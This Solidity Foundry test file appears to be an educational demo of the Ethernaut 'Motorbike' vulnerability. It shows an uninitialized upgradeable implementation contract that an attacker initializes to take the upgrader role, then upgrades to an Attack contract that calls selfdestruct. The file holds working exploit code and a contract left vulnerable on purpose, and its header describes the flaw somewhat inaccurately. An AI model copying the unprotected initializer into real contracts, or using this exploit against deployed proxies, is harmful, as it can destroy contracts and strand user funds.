// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

/*
Name: Uninitialized variable Vulnerability

Description:
Uninitialized local storage variables may contain the value of other storage variables in the contract; 
this fact can cause unintentional vulnerabilities, or be exploited deliberately.

REF:
https://blog.dixitaditya.com/ethernaut-level-25-motorbike
*/

contract ContractTest is Test {
    Engine EngineContract;
    Motorbike MotorbikeContract;
    Attack AttackContract;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testUninitialized() public {
        EngineContract = new Engine();
        MotorbikeContract = new Motorbike(address(EngineContract));
        AttackContract = new Attack();

        // Engine contract is not initialized
        console.log("Unintialized Upgrader:", EngineContract.upgrader());
        // Malicious user calls initialize() on Engine contract to become upgrader.
        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
        // Malicious user becomes the upgrader
        console.log("Initialized Upgrader:", EngineContract.upgrader());

        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`
        bytes memory initEncoded = abi.encodeWithSignature("attack()");
        address(EngineContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(AttackContract),
                initEncoded
            )
        );

        console.log("Exploit completed");
        console.log("Since EngineContract destroyed, next call will fail.");
        address(EngineContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(AttackContract),
                initEncoded
            )
        );
    }
}

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) {
        require(
            Address.isContract(_logic),
            "ERC1967: new implementation is not a contract"
        );
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(
                gas(),
                implementation,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    event Returny(uint256);

    function greetMe() public {
        emit Returny(0x42);
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        AddressSlot storage r;
        assembly {
            r.slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}

contract Attack {
    function attack() external {
        selfdestruct(payable(msg.sender));
    }
}
